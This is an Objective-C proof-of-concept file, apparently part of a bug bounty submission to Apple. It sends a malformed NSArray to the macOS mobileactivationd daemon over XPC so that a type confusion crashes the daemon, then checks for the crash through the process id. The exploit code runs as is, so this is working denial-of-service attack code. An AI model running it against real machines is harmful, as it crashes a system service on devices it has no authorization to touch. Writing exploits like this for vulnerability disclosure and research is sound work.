/*
 * 42-mobileactivationd-pregate-type-confusion-dos: Unprivileged DoS of
 * /usr/libexec/mobileactivationd via NSArray-where-NSDictionary type
 * confusion in pre-entitlement-gate code path.
 *
 * Apple Security Bounty research PoC.
 * Test device: iPhone 15 Pro (iPhone16,1), iOS 26.3 (23D127), personally
 * owned by the researcher and intentionally activation-locked for this
 * research. Daemon under test is the macOS counterpart
 * /usr/libexec/mobileactivationd (build MobileActivation-834.140.3.701.1),
 * bundled with macOS 14+. Not a general-purpose bypass tool -- this file
 * demonstrates a specific vulnerability for responsible disclosure to
 * Apple under the Apple Security Bounty Program
 * (https://security.apple.com/bounty/).
 *
 * Companion writeup: submission/42-mobileactivationd-pregate-type-confusion-dos/finding.md
 *
 * Build: make
 * Run:   ./poc   (runs on local Mac, no iOS device required)
 * Deps:  macOS 14+, Xcode command-line tools
 */

#import <Foundation/Foundation.h>
#include <dlfcn.h>
#include <signal.h>

@protocol MADStub <NSObject>
- (void)createActivationInfo:(id)options withCompletionBlock:(void (^)(NSDictionary *result, NSError *err))completion;
- (void)issueUCRT:(id)options withCompletionBlock:(void (^)(NSDictionary *result, NSError *err))completion;
@end

static int pid_of_mobileactivationd(void) {
    FILE *f = popen("pgrep -x mobileactivationd | head -1", "r");
    if (!f) return -1;
    int pid = -1;
    fscanf(f, "%d", &pid);
    pclose(f);
    return pid;
}

int main(void) { @autoreleasepool {
    if (!dlopen("/System/Library/PrivateFrameworks/MobileActivationMacOS.framework/MobileActivationMacOS", RTLD_LAZY)) {
        fprintf(stderr, "dlopen failed: %s\n", dlerror());
        return 2;
    }

    int pid_before = pid_of_mobileactivationd();
    NSLog(@"[before] mobileactivationd pid=%d", pid_before);

    NSXPCConnection *c = [[NSXPCConnection alloc] initWithMachServiceName:@"com.apple.mobileactivationd" options:0];
    Protocol *p = NSProtocolFromString(@"MobileActivationMacOSProtocol");
    if (!p) { NSLog(@"protocol not registered"); return 2; }
    c.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:p];
    c.invalidationHandler = ^{ NSLog(@"[xpc] connection invalidated (daemon likely crashed)"); };
    [c resume];

    id<MADStub> proxy = c.remoteObjectProxy;

    /* Send NSArray where NSDictionary expected.  The pre-gate
     * code path at offsets 0x100013C30 and 0x100017DD8 calls
     * -[options objectForKeyedSubscript:<const NSString>] without
     * an NSDictionary type-check, raising an uncaught ObjC
     * exception that reaches abort(). */
    id malformed = (id)@[@"a", @"b", @"c"];

    __block int callbacks = 0;
    dispatch_semaphore_t sem = dispatch_semaphore_create(0);

    [proxy createActivationInfo:malformed withCompletionBlock:^(NSDictionary *r, NSError *e) {
        NSLog(@"[createActivationInfo] result=%@ err=%@", r, e);
        if (++callbacks == 2) dispatch_semaphore_signal(sem);
    }];

    [proxy issueUCRT:malformed withCompletionBlock:^(NSDictionary *r, NSError *e) {
        NSLog(@"[issueUCRT] result=%@ err=%@", r, e);
        if (++callbacks == 2) dispatch_semaphore_signal(sem);
    }];

    /* Either callback fires with an error, or the daemon crashes and
     * the connection invalidates without the callback.  Both are
     * observable; we wait 5 seconds then inspect the pid. */
    dispatch_semaphore_wait(sem, dispatch_time(DISPATCH_TIME_NOW, 5LL * NSEC_PER_SEC));
    [c invalidate];

    /* Allow launchd a moment to observe the crash and respawn. */
    usleep(1500000);
    int pid_after = pid_of_mobileactivationd();
    NSLog(@"[after ] mobileactivationd pid=%d", pid_after);

    if (pid_before > 0 && pid_after > 0 && pid_before != pid_after) {
        NSLog(@"FINDING CONFIRMED: mobileactivationd pid changed from %d to %d", pid_before, pid_after);
        NSLog(@"Unprivileged process crashed system daemon via pre-gate type confusion.");
        NSLog(@"Check ~/Library/Logs/DiagnosticReports/ for mobileactivationd-*.ips reports.");
        return 0;
    }
    NSLog(@"NOT CONFIRMED on this hardware/build. Check daemon pid manually and ~/Library/Logs/DiagnosticReports/");
    return 1;
}}
